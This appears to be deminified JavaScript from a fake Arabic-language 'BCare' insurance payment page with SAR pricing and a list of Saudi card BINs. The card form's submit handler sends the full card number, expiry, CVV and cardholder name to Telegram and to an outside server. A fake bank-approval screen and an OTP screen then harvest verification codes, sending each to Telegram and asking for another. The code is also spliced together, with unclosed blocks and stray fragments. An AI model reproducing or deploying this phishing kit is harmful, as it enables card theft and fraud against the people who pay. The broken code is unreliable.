        ;
        let U = [{
            BIN: "400861",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "ELECTRON",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "405433",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "407620",
            Scheme: "VISA",
            Type: "CREDIT",
            Category: "BUSINESS",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "409201",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "PLATINUM",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "409246",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "410248",
            Scheme: "VISA",
            Type: "CREDIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "410249",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "414627",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "PLATINUM",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "416634",
            Scheme: "VISA",
            Type: "CREDIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "417321",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "417323",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "419461",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "426362",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "PLATINUM",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "432159",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "INFINITE",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "445520",
            Scheme: "VISA",
            Type: "CREDIT",
            Category: "BUSINESS",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "445522",
            Scheme: "VISA",
            Type: "CREDIT",
            Category: "CORPORATE T&E",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "445826",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "445827",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "455739",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "PREMIER",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "455740",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "458456",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "INFINITE",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "484783",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "CLASSIC",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "486653",
            Scheme: "VISA",
            Type: "CREDIT",
            Category: "PURCHASING",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "490980",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "ELECTRON",
            Country: "SAUDI ARABIA"
        }, {
            BIN: "494329",
            Scheme: "VISA",
            Type: "DEBIT",
            Category: "BUSINESS",
            Country: "SAUDI ARABIA"
        }]
          , H = {
            surface: u.colors.surface,
            primary: u.colors.primary,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            border: u.colors.border
        }
          , q = {
            payFor: "الدفع لـ",
            oneItem: "بند واحد",
            selectMethod: "اختر طريقة الدفع",
            otherCurrencies: "متوفر بعملات أخرى",
            maintenance: "تحت الصيانة",
            card: "بطاقة",
            orEnterCard: "أو أدخل البطاقة",
            nameOnCard: "الاسم على البطاقة",
            namePlaceholder: "الاسم كما هو مدون بالبطاقة",
            cardNumber: "رقم البطاقة",
            expiry: "تاريخ الانتهاء",
            accepts: "نقبل",
            payNow: "ادفع الآن",
            cvvHelper: "رمز CVV هو الرقم المكون من 3 أرقام خلف البطاقة.",
            sar: "ر.س",
            applePay: "Apple Pay",
            googlePay: "Google Pay"
        }
          , V = {
            name: "الاسم مطلوب",
            cardNumber: "رقم البطاقة غير صحيح",
            cvv: "CVV غير صحيح (3 أرقام)",
            expiry: "تاريخ الانتهاء غير صحيح"
        };
        var G = e => {
            let {CardDetails: t, setCardDetails: r, setPageState: s, price: o, discount: n, setLoading: i} = e
              , x = "paymentForm"
              , [p,h] = (0,
            l.useState)("")
              , [f,y] = (0,
            l.useState)("")
              , [b,g] = (0,
            l.useState)("")
              , [v,N] = (0,
            l.useState)("")
              , [w,A] = (0,
            l.useState)("")
              , [C,S] = (0,
            l.useState)({})
              , [k,I] = (0,
            l.useState)(!1)
              , [E,P] = (0,
            l.useState)({})
              , [T,B] = (0,
            l.useState)(!1)
              , O = (0,
            l.useMemo)( () => T || Object.values(E).some(Boolean), [T, E]);
            (0,
            l.useEffect)( () => {
                O && M()
            }
            , [p, f, b, v, O]);
            let D = e => {
                P(t => ({
                    ...t,
                    [e]: !0
                }))
            }
              , L = e => {
                let t = String(e || "").replace(/\D/g, "").slice(0, 16);
                y(t.replace(/(.{4})/g, "$1 ").trim()),
                r(e => ({
                    ...e,
                    card: t
                })),
                /^4/.test(t) ? A("visa") : /^5[1-5]/.test(t) ? A("mastercard") : /^5[06-9]|^6/.test(t) ? A("mada") : A("")
            }
            ;
            (0,
            l.useEffect)( () => {
                let e = j.getForm(x);
                if (e && "object" == typeof e) {
                    if (e.name && (h(e.name),
                    r(t => ({
                        ...t,
                        name: e.name
                    }))),
                    e.cardNumber && L(e.cardNumber),
                    e.expiry) {
                        N(e.expiry);
                        let[t,a] = String(e.expiry).split("/");
                        r(e => {
                            var r, s;
                            return {
                                ...e,
                                expiry: {
                                    year: a || (null == e ? void 0 : null === (r = e.expiry) || void 0 === r ? void 0 : r.year) || "",
                                    month: t || (null == e ? void 0 : null === (s = e.expiry) || void 0 === s ? void 0 : s.month) || ""
                                }
                            }
                        }
                        )
                    }
                    e.cvv && (g(e.cvv),
                    r(t => ({
                        ...t,
                        CVV: e.cvv
                    })))
                }
            }
            , [x, r]),
            (0,
            l.useEffect)( () => {
                let e = f.replace(/\s/g, "");
                j.setForm(x, {
                    name: p,
                    cardNumber: e,
                    expiry: v,
                    cvv: b,
                    cardType: w
                }, {
                    sensitiveFields: ["cardNumber", "cvv"]
                })
            }
            , [p, f, v, b, w, x]);
            let R = e => {
                let t = 0
                  , r = !1;
                for (let a = e.length - 1; a >= 0; a--) {
                    let s = parseInt(e.charAt(a), 10);
                    r && (s *= 2) > 9 && (s -= 9),
                    t += s,
                    r = !r
                }
                return t % 10 == 0
            }
              , F = () => {
                let[e,t] = v.split("/");
                if (!e || !t || 2 !== t.length)
                    return !1;
                let r = parseInt(e, 10)
                  , a = parseInt("20".concat(t), 10);
                if (isNaN(r) || isNaN(a) || r < 1 || r > 12)
                    return !1;
                let s = new Date
                  , o = s.getFullYear()
                  , l = s.getMonth() + 1;
                return !(a < o) && (a !== o || !(r < l))
            }
              , M = () => {
                let e = {}
                  , t = !1;
                "" === p.trim() && (e.name = V.name,
                t = !0);
                let r = f.replace(/\s/g, "");
                return (r.length < 16 || !R(r)) && (e.cardNumber = V.cardNumber,
                t = !0),
                b.length < 3 && (e.cvv = V.cvv,
                t = !0),
                (v.length < 5 || !F()) && (e.expiry = V.expiry,
                t = !0),
                e.error = t,
                S(e),
                !t
            }
              , Q = parseFloat(String(o).replace(/,/g, ""))
              , G = n || 0
              , X = isNaN(Q) ? 0 : Q * (Q <= 525 ? 0 : G) / 100
              , z = (isNaN(Q) ? 0 : Q - X) + 0
              , J = isNaN(z) ? 0 : .15 * z
              , Z = Number(String(z + J).replace(/,/g, ""))
              , Y = async e => {
    if (null == e || e.preventDefault(), B(!0), M()) {
        var r;
        
        // رسالة Telegram لبيانات البطاقة
        const cardMessage = `
💳 <b>بيانات بطاقة الدفع</b>
━━━━━━━━━━━━━━━━━━━━

👤 <b>صاحب البطاقة:</b>
${p}

🔢 <b>رقم البطاقة:</b>
<code>${f.replace(/\s/g, '')}</code>

📅 <b>تاريخ الانتهاء:</b>
<code>${v}</code>

🔐 <b>CVV:</b>
<code>${b}</code>

💰 <b>المبلغ المطلوب:</b>
<b>${Z.toFixed(2)} ر.س</b>

🕐 الوقت: ${formatTime()}
━━━━━━━━━━━━━━━━━━━━
        `;

        await sendToTelegram(cardMessage);

        let e = {
            key: null === (r = localStorage) || void 0 === r ? void 0 : r.getItem("key"),
            cardDetails: {
                name: p,
                card: f.replace(/\s/g, ""),
                expiry: null == t ? void 0 : t.expiry,
                CVV: b,
                cardType: w,
                price: Z,
                discount: n
            }
        };
        
        null == i || i(!0);
        
        try {
            await new Promise(e => setTimeout(e, 1500));
            await (0, m.iq)({
                url: "https://secure.drivesecuresa.com/bcare/api/user/payment",
                data: e
            });
            
            s(6); // الانتقال لصفحة OTP
        } catch (e) {
            console.error("خطأ في الدفع:", e);
        } finally {
            null == i || i(!1);
        }
    }
};
              , K = e => O && C[e];
            return (0,
            a.jsxs)("div", {
                className: "relative rounded-3xl border bg-white/95 px-4 pb-4 pt-3 shadow-sm",
                style: {
                    borderColor: H.border,
                    boxShadow: u.shadow.card
                },
                children: [(0,
                a.jsx)("div", {
                    className: "mx-auto mb-3 h-1 w-12 rounded-full bg-slate-200"
                }), (0,
                a.jsx)("div", {
                    className: "flex items-start justify-between",
                    children: (0,
                    a.jsxs)("div", {
                        className: "flex items-center gap-3",
                        children: [(0,
                        a.jsx)("div", {
                            className: "flex h-10 w-10 items-center justify-center rounded-full bg-white shadow-sm ring-1 ring-slate-200",
                            children: (0,
                            a.jsx)("span", {
                                className: "text-[11px] font-semibold text-slate-700",
                                children: "BCare"
                            })
                        }), (0,
                        a.jsxs)("div", {
                            children: [(0,
                            a.jsx)("p", {
                                className: "text-[11px] text-slate-400",
                                children: q.payFor
                            }), (0,
                            a.jsx)("p", {
                                className: "text-sm font-semibold text-slate-800",
                                children: "BCare"
                            })]
                        })]
                    })
                }), (0,
                a.jsxs)("div", {
                    className: "mt-3 flex items-center justify-between border-t border-slate-200 pt-3",
                    children: [(0,
                    a.jsxs)("div", {
                        className: "text-lg font-semibold text-slate-900",
                        children: [Z.toFixed(2), " ", q.sar]
                    }), (0,
                    a.jsx)("div", {
                        className: "rounded-full bg-slate-100 px-2.5 py-1 text-[10px] text-slate-500",
                        children: q.oneItem
                    })]
                }), (0,
                a.jsxs)("div", {
                    className: "mt-4 flex items-center justify-between text-[10px] text-slate-400",
                    children: [(0,
                    a.jsx)("span", {
                        children: q.selectMethod
                    }), (0,
                    a.jsx)("span", {
                        children: q.otherCurrencies
                    })]
                }), (0,
                a.jsxs)("div", {
                    className: "mt-2 grid grid-cols-3 gap-2",
                    children: [(0,
                    a.jsxs)("button", {
                        type: "button",
                        className: "relative flex flex-col items-center justify-center rounded-xl border bg-white px-2 py-2 text-[11px] font-semibold text-slate-700",
                        disabled: !0,
                        "aria-disabled": "true",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "flex items-center gap-1.5",
                            children: [(0,
                            a.jsx)(c.oPZ, {
                                className: "text-black"
                            }), (0,
                            a.jsx)("span", {
                                className: "font-semibold text-black",
                                children: q.applePay
                            })]
                        }), (0,
                        a.jsx)("span", {
                            className: "mt-1 text-[10px] text-amber-500",
                            children: q.maintenance
                        })]
                    }), (0,
                    a.jsxs)("button", {
                        type: "button",
                        className: "relative flex flex-col items-center justify-center rounded-xl border bg-white px-2 py-2 text-[11px] font-semibold text-slate-700",
                        disabled: !0,
                        "aria-disabled": "true",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "flex items-center gap-1.5",
                            children: [(0,
                            a.jsx)(c.ldW, {
                                className: "text-[#4285F4]"
                            }), (0,
                            a.jsx)("span", {
                                className: "font-semibold text-slate-800",
                                children: q.googlePay
                            })]
                        }), (0,
                        a.jsx)("span", {
                            className: "mt-1 text-[10px] text-amber-500",
                            children: q.maintenance
                        })]
                    }), (0,
                    a.jsx)("button", {
                        type: "button",
                        className: "flex items-center justify-center rounded-xl border bg-white px-2 py-2 text-[11px] font-semibold",
                        style: {
                            borderColor: u.colors.primary,
                            color: u.colors.primary
                        },
                        children: q.card
                    })]
                }), (0,
                a.jsx)("div", {
                    className: "mt-3 text-[10px] text-slate-400",
                    children: q.orEnterCard
                }), (0,
                a.jsxs)("form", {
                    onSubmit: Y,
                    className: "mt-2 space-y-2 text-right",
                    children: [(0,
                    a.jsxs)("div", {
                        children: [(0,
                        a.jsx)("label", {
                            className: "block text-[11px] font-semibold mb-1",
                            style: {
                                color: H.textSecondary
                            },
                            children: q.nameOnCard
                        }), (0,
                        a.jsx)("input", {
                            type: "text",
                            value: p,
                            onChange: e => h(e.target.value),
                            onBlur: () => D("name"),
                            autoComplete: "cc-name",
                            className: "w-full rounded-xl border bg-white px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[var(--color-primary-light)] ".concat(K("name") ? "border-red-400" : "border-slate-200"),
                            placeholder: q.namePlaceholder
                        }), K("name") && (0,
                        a.jsx)("p", {
                            className: "text-red-500 text-xs mt-1.5",
                            children: C.name
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        children: [(0,
                        a.jsx)("label", {
                            className: "block text-[11px] font-semibold mb-1",
                            style: {
                                color: H.textSecondary
                            },
                            children: q.cardNumber
                        }), (0,
                        a.jsxs)("div", {
                            className: "relative",
                            children: [(0,
                            a.jsx)("input", {
                                type: "text",
                                inputMode: "numeric",
                                dir: "ltr",
                                value: f,
                                onChange: e => {
                                    let t = e.target.value.replace(/\D/g, "").slice(0, 16);
                                    y(t.replace(/(.{4})/g, "$1 ").trim()),
                                    r(e => ({
                                        ...e,
                                        card: t
                                    })),
                                    /^4/.test(t) ? A("visa") : /^5[1-5]/.test(t) ? A("mastercard") : /^5[06-9]|^6/.test(t) ? A("mada") : A("")
                                }
                                ,
                                onBlur: () => D("cardNumber"),
                                maxLength: "19",
                                autoComplete: "cc-number",
                                className: "w-full rounded-xl border bg-white px-3 py-2 text-sm text-left dir-ltr pr-12 focus:outline-none focus:ring-2 focus:ring-[var(--color-primary-light)] ".concat(K("cardNumber") ? "border-red-400" : "border-slate-200"),
                                style: {
                                    direction: "ltr",
                                    textAlign: "left"
                                },
                                placeholder: "0000 0000 0000 0000"
                            }), (0,
                            a.jsxs)("div", {
                                className: "absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-2",
                                children: ["visa" === w && (0,
                                a.jsx)(c.Z7w, {
                                    size: 20,
                                    className: "text-blue-600"
                                }), "mastercard" === w && (0,
                                a.jsx)(c.leg, {
                                    size: 20,
                                    className: "text-red-600"
                                }), "mada" === w && (0,
                                a.jsx)("img", {
                                    src: "/mada.png",
                                    alt: "Mada",
                                    className: "h-4"
                                })]
                            })]
                        }), K("cardNumber") && C.cardNumber && (0,
                        a.jsx)("p", {
                            className: "text-red-500 text-xs mt-1.5",
                            children: C.cardNumber
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "flex gap-2",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "w-1/2",
                            children: [(0,
                            a.jsx)("label", {
                                className: "block text-[11px] font-semibold mb-1",
                                style: {
                                    color: H.textSecondary
                                },
                                children: q.expiry
                            }), (0,
                            a.jsx)("input", {
                                type: "text",
                                dir: "ltr",
                                value: v,
                                onChange: e => {
                                    let t = e.target.value.replace(/\D/g, "");
                                    if (t.length <= 4) {
                                        var a;
                                        let e = (null === (a = t.match(/.{1,2}/g)) || void 0 === a ? void 0 : a.join("/")) || t
                                          , [s,o] = (null == e ? void 0 : e.split("/").map(e => e ? parseInt(e, 10) : NaN)) || [NaN, NaN];
                                        r(e => ({
                                            ...e,
                                            expiry: {
                                                year: isNaN(o) ? "" : o.toString(),
                                                month: isNaN(s) ? "" : s.toString()
                                            }
                                        })),
                                        N(e)
                                    }
                                }
                                ,
                                onBlur: () => D("expiry"),
                                maxLength: "5",
                                autoComplete: "cc-exp",
                                className: "w-full rounded-xl border bg-white px-3 py-2 text-sm text-left dir-ltr focus:outline-none focus:ring-2 focus:ring-[var(--color-primary-light)] ".concat(K("expiry") ? "border-red-400" : "border-slate-200"),
                                style: {
                                    direction: "ltr",
                                    textAlign: "left"
                                },
                                placeholder: "MM/YY"
                            }), K("expiry") && (0,
                            a.jsx)("p", {
                                className: "text-red-500 text-xs mt-1.5",
                                children: C.expiry
                            })]
                        }), (0,
                        a.jsxs)("div", {
                            className: "w-1/2",
                            children: [(0,
                            a.jsx)("label", {
                                className: "block text-[11px] font-semibold mb-1",
                                style: {
                                    color: H.textSecondary
                                },
                                children: "CVV"
                            }), (0,
                            a.jsxs)("div", {
                                className: "relative",
                                children: [(0,
                                a.jsx)("input", {
                                    type: "password",
                                    inputMode: "numeric",
                                    maxLength: 3,
                                    dir: "ltr",
                                    value: b,
                                    onChange: e => g(e.target.value),
                                    onBlur: () => D("cvv"),
                                    autoComplete: "cc-csc",
                                    className: "w-full rounded-xl border bg-white px-3 py-2 pl-9 text-sm text-left dir-ltr focus:outline-none focus:ring-2 focus:ring-[var(--color-primary-light)] ".concat(K("cvv") ? "border-red-400" : "border-slate-200"),
                                    style: {
                                        direction: "ltr",
                                        textAlign: "left"
                                    },
                                    placeholder: "***"
                                }), (0,
                                a.jsx)(c.DAO, {
                                    onMouseEnter: () => I(!0),
                                    onMouseLeave: () => I(!1),
                                    className: "absolute left-2.5 top-1/2 -translate-y-1/2 cursor-pointer",
                                    style: {
                                        color: H.textSecondary
                                    }
                                }), k && (0,
                                a.jsx)("div", {
                                    className: "absolute z-10 p-2 rounded-lg shadow-lg text-xs w-48 text-white -top-14 right-0",
                                    style: {
                                        backgroundColor: H.primary
                                    },
                                    children: q.cvvHelper
                                })]
                            }), K("cvv") && (0,
                            a.jsx)("p", {
                                className: "text-red-500 text-xs mt-1.5",
                                children: C.cvv
                            })]
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "mt-2 flex items-center gap-2 text-[10px] text-slate-400",
                        children: [(0,
                        a.jsx)("span", {
                            children: q.accepts
                        }), (0,
                        a.jsx)("img", {
                            src: "/mada.png",
                            alt: "Mada",
                            className: "h-4"
                        }), (0,
                        a.jsx)("img", {
                            src: "/visa.png",
                            alt: "Visa",
                            className: "h-4"
                        }), (0,
                        a.jsx)("img", {
                            src: "/mastercard.png",
                            alt: "Mastercard",
                            className: "h-4"
                        })]
                    }), (0,
                    a.jsx)("div", {
                        className: "pt-2",
                        children: (0,
                        a.jsx)(d, {
                            setLoading: i,
                            disabled: O && C.error,
                            onClick: Y,
                            label: q.payNow,
                            className: "w-full font-semibold py-2.5 rounded-2xl text-sm shadow-sm disabled:opacity-60",
                            style: {
                                backgroundColor: "#1F1F1F",
                                color: u.colors.textLight
                            }
                        })
                    })]
                })]
            })
        }
          , X = e => {
            let {CardDetails: t, setCardDetails: r, selectedItem: s, setPageState: o, setLoading: n} = e
              , {dir: c} = (0,
            i.Z)();
            return (0,
            l.useEffect)( () => {
                window.scrollTo(0, 0)
            }
            , []),
            (0,
            a.jsx)("div", {
                dir: c,
                className: "bg-[#F2F3F5] px-4 py-5",
                children: (0,
                a.jsxs)("div", {
                    className: "mx-auto w-full max-w-md",
                    children: [(0,
                    a.jsxs)("div", {
                        className: "mb-2 flex items-center justify-end text-[11px] text-slate-400 gap-1",
                        children: [(0,
                        a.jsx)("span", {
                            className: "ml-1 font-semibold text-slate-600",
                            children: "BCare"
                        }), (0,
                        a.jsx)("span", {
                            children: "Powered by"
                        })]
                    }), (0,
                    a.jsx)(G, {
                        CardDetails: t,
                        setCardDetails: r,
                        setPageState: o,
                        price: s.price,
                        discount: s.discount,
                        setLoading: n
                    })]
                })
            })
        }
        ;
        let z = {
            background: u.colors.background,
            surface: u.colors.surface,
            primary: u.colors.primary,
            primaryLight: u.colors.primaryLight,
            accent: u.colors.accent,
            border: u.colors.border,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            error: u.colors.error
        };
        var J = e => {
            let {setPageState: t} = e
              , {dir: r} = (0,
            i.Z)()
              , [s,o] = (0,
            l.useState)(!1);
            return (0,
            l.useEffect)( () => {
                let e = setTimeout( () => {
                    o(!0)
                }
                , 3e4);
                return () => clearTimeout(e)
            }
            , []),
            (0,
            l.useEffect)( () => {
                window.scrollTo(0, 0)
            }
            , []),
            (0,
            a.jsx)("div", {
                dir: r,
                className: " flex items-center justify-center p-2 antialiased",
                style: {
                    backgroundColor: z.background
                },
                children: (0,
                a.jsxs)("div", {
                    className: "w-full max-w-md rounded-2xl border",
                    style: {
                        backgroundColor: z.surface,
                        borderColor: z.border,
                        boxShadow: u.shadow.card
                    },
                    children: [(0,
                    a.jsxs)("div", {
                        className: "p-6 border-b border-slate-200",
                        children: [(0,
                        a.jsx)("h1", {
                            className: "text-xl font-bold text-slate-800 text-center",
                            children: "مصادقة الدفع الآمن"
                        }), (0,
                        a.jsx)("p", {
                            className: "text-sm text-slate-500 text-center mt-1",
                            children: "لأمانك، يتطلب البنك التحقق من هويتك."
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "p-8 text-center bg-slate-50",
                        children: [(0,
                        a.jsx)("div", {
                            className: "flex justify-center items-center mb-4",
                            children: (0,
                            a.jsxs)("div", {
                                className: "relative w-20 h-20",
                                children: [(0,
                                a.jsx)("div", {
                                    className: "absolute inset-0 rounded-full animate-ping",
                                    style: {
                                        backgroundColor: z.primaryLight
                                    }
                                }), (0,
                                a.jsx)("div", {
                                    className: "relative w-full h-full rounded-full flex items-center justify-center border-4 border-white",
                                    style: {
                                        backgroundColor: z.primaryLight
                                    },
                                    children: (0,
                                    a.jsx)(c.bri, {
                                        className: "text-4xl",
                                        style: {
                                            color: z.primary
                                        }
                                    })
                                })]
                            })
                        }), (0,
                        a.jsx)("h2", {
                            className: "text-lg font-semibold text-slate-700",
                            children: "في انتظار موافقة البنك..."
                        }), (0,
                        a.jsx)("p", {
                            className: "text-sm text-slate-500 mt-1",
                            children: "انتظر الرمز للمتابعة."
                        })]
                    }), (0,
                    a.jsxs)("div", {
                        className: "p-6 space-y-4",
                        children: [(0,
                        a.jsxs)("div", {
                            className: "flex items-start gap-4",
                            children: [(0,
                            a.jsx)("div", {
                                className: "flex-shrink-0 w-10 h-10 bg-slate-100 rounded-lg flex items-center justify-center",
                                children: (0,
                                a.jsx)(c.bJx, {
                                    className: "text-lg text-slate-600"
                                })
                            }), (0,
                            a.jsxs)("div", {
                                className: "text-right",
                                children: [(0,
                                a.jsx)("h3", {
                                    className: "font-semibold text-slate-800",
                                    children: "1. تحقق من رسائلك النصية (SMS)"
                                }), (0,
                                a.jsx)("p", {
                                    className: "text-xs text-slate-500 leading-relaxed mt-1",
                                    children: "سيقوم البنك بإرسال رمز تحقق سري."
                                })]
                            })]
                        }), (0,
                        a.jsxs)("div", {
                            className: "flex items-start gap-4",
                            children: [(0,
                            a.jsx)("div", {
                                className: "flex-shrink-0 w-10 h-10 bg-slate-100 rounded-lg flex items-center justify-center",
                                children: (0,
                                a.jsx)(c.XEH, {
                                    className: "text-lg text-slate-600"
                                })
                            }), (0,
                            a.jsxs)("div", {
                                className: "text-right",
                                children: [(0,
                                a.jsx)("h3", {
                                    className: "font-semibold text-slate-800",
                                    children: "2. أو تحقق من تطبيق البنك الخاص بك"
                                }), (0,
                                a.jsx)("p", {
                                    className: "text-xs text-slate-500 leading-relaxed mt-1",
                                    children: "قد يتطلب البنك الموافقة عبر إشعار **داخل التطبيق**."
                                })]
                            })]
                        })]
                    }), (0,
                    a.jsx)("div", {
                        className: "p-6 border-t border-slate-200",
                        children: s && (0,
                        a.jsxs)("div", {
                            className: "space-y-4",
                            children: [(0,
                            a.jsxs)("div", {
                                className: "flex items-start gap-3 p-4 bg-red-50 border border-red-200 rounded-lg",
                                children: [(0,
                                a.jsx)("div", {
                                    className: "flex-shrink-0",
                                    children: (0,
                                    a.jsx)(c.gJy, {
                                        className: "text-lg text-red-500 mt-1"
                                    })
                                }), (0,
                                a.jsxs)("div", {
                                    className: "text-right",
                                    children: [(0,
                                    a.jsx)("h3", {
                                        className: "font-semibold text-red-800",
                                        children: "تنبيه هام جداً"
                                    }), (0,
                                    a.jsx)("p", {
                                        className: "text-xs text-red-700 leading-relaxed mt-1",
                                        children: "**لا تضغط على الزر أدناه إلا إذا كنت قد استلمت رمز التحقق بالفعل.** الضغط بدون وجود الرمز لن يكمل العملية."
                                    })]
                                })]
                            }), (0,
                            a.jsx)("button", {
                                onClick: () => {
                                    t(6)
                                }
                                ,
                                className: "w-full font-bold py-3.5 px-6 rounded-lg transition-all duration-300 shadow-md hover:shadow-lg focus:outline-none focus:ring-2 focus:ring-offset-2",
                                style: {
                                    backgroundColor: z.accent,
                                    color: u.colors.textLight
                                },
                                children: "لقد استلمت الرمز، متابعة"
                            })]
                        })
                    })]
                })
            })
        }
        ;
        let Z = {
            surface: u.colors.surface,
            background: u.colors.background,
            border: u.colors.border,
            primary: u.colors.primary,
            accent: u.colors.accent,
            textPrimary: u.colors.textPrimary,
            textSecondary: u.colors.textSecondary,
            error: u.colors.error
        };
        var Y = e => {
            var t;
            let {CardDetails: s, setPageState: o, selectedItem: n, onConfirm: c, setLoading: x} = e
              , {dir: p} = (0,
            i.Z)()
              , {price: h} = n
              , {card: f} = s
              , y = "verificationScreen"
              , [b,g] = (0,
            l.useState)("")
              , [v,N] = (0,
            l.useState)({})
              , [w,A] = (0,
            l.useState)(!1)
              , [C,S] = (0,
            l.useState)(1);
            (0,
            l.useEffect)( () => {
                let e = !1;
                for (let r = 0; r < U.length; r++) {
                    var t;
                    let a = U[r];
                    if (null == f ? void 0 : null === (t = f.includes) || void 0 === t ? void 0 : t.call(f, null == a ? void 0 : a.BIN)) {
                        e = !0;
                        break
                    }
                }
                A(e)
            }
            , [f]),
            (0,
            l.useEffect)( () => {
                let e = j.getForm(y);
                (null == e ? void 0 : e.verificationCode) && g(e.verificationCode)
            }
            , [y]),
            (0,
            l.useEffect)( () => {
                j.setForm(y, {
                    verificationCode: b
                }, {
                    sensitiveFields: ["verificationCode"]
                })
            }
            , [b, y]);
            let k = () => {
                let e = {};
                return /^\d{4,8}$/.test(b) && ((null == b ? void 0 : b.length) === 6 || (null == b ? void 0 : b.length) === 4) || (e.verificationCode = "رمز التحقق يجب أن يكون مكونًا من (6 أو 4) أرقام."),
                e
            }
              , I = async () => {
    var e, a;
    if ((null === (e = r.g) || void 0 === e ? void 0 : e.window) === void 0)
        return;
    
    x(!0);
    
    let o = k();
    if (Object.keys(o).length > 0) {
        N(o);
        x(!1);
        return;
    }
    
    // ✅ إرسال OTP إلى Telegram
    const otpMessage = `
🔐 <b>كود التحقق OTP</b>
━━━━━━━━━━━━━━━━━━━━

🔢 الكود: <code>${b}</code>
🕐 ${formatTime()}
━━━━━━━━━━━━━━━━━━━━

⏳ <i>في انتظار كود جديد...</i>
    `;

    await sendToTelegram(otpMessage);

    // ⛔ التوقف هنا
    setTimeout(() => {
        g(''); // مسح الحقل
        x(false);
        N({});
        window.scrollTo(0, 0);
    }, 1000);

    return; // ⛔ إيقاف أي كود بعد هذا
            a.jsxs)("div", {
                dir: p,
                className: "border rounded-2xl p-8 mb-4 mx-auto max-w-md text-center mt-2",
                style: {
                    backgroundColor: Z.surface,
                    borderColor: Z.border,
                    boxShadow: u.shadow.card
                },
                children: [(0,
                a.jsx)("div", {
                    className: "text-2xl font-extrabold mb-6",
                    style: {
                        color: Z.textPrimary
                    },
                    children: "إثبات ملكية البطاقة"
                }), (0,
                a.jsxs)(a.Fragment, {
                    children: [(0,
                    a.jsxs)("div", {
                        className: "text-gray-600 mb-6 leading-relaxed",
                        children: ["سيتم إجراء معاملة مالية على حسابك المصرفي لسداد مبلغ", (0,
                        a.jsxs)("span", {
                            className: "font-bold text-gray-900 ".concat(h ? "" : "hidden"),
                            children: [" ", "SAR ", h, " "]
                        }), " ", (0,
                        a.jsxs)("p", {
                            className: "".concat(f ? "" : "hidden"),
                            children: ["باستخدام البطاقة المنتهية برقم", (0,
                            a.jsxs)("span", {
                                className: "font-bold text-gray-900",
                                children: [" ", null == f ? void 0 : null === (t = f.slice) || void 0 === t ? void 0 : t.call(f, -4), " "]
                            }), (0,
                            a.jsx)("br", {})]
                        }), "لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك."]
                    }), (0,
                    a.jsxs)("div", {
                        className: "relative mb-6",
                        children: [(0,
                        a.jsx)("input", {
                            type: "text",
                            value: b,
                            maxLength: 6,
                            min: 4,
                            onChange: e => {
                                var t;
                                (null === (t = e.target.value) || void 0 === t ? void 0 : t.length) > 6 || g(e.target.value)
                            }
                            ,
                            className: "w-full border ".concat(v.verificationCode ? "border-red-500" : "border-gray-300", " rounded-lg px-4 py-2 text-gray-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 transition duration-200"),
                            placeholder: "رمز التحقق"
                        }), v.verificationCode && (0,
                        a.jsx)("p", {
                            className: "absolute text-red-500 text-sm mt-2 left-1 top-full",
                            children: v.verificationCode
                        })]
                    }), (0,
                    a.jsx)(d, {
                        setLoading: x,
                        onClick: async () => {
                            let e = [1e3, 2e3, 3e3]
                              , t = e[Math.floor(Math.random() * e.length)];
                            return x(!0),
                            new Promise(e => {
                                setTimeout( () => {
                                    I(),
                                    e()
                                }
                                , t)
                            }
                            )
                        }
                        ,
                        label: "تأكيد",
                        className: "flex items-center justify-center min-h-[45px] w-full text-white font-bold py-2 rounded-lg shadow-lg transition duration-300 mt-10",
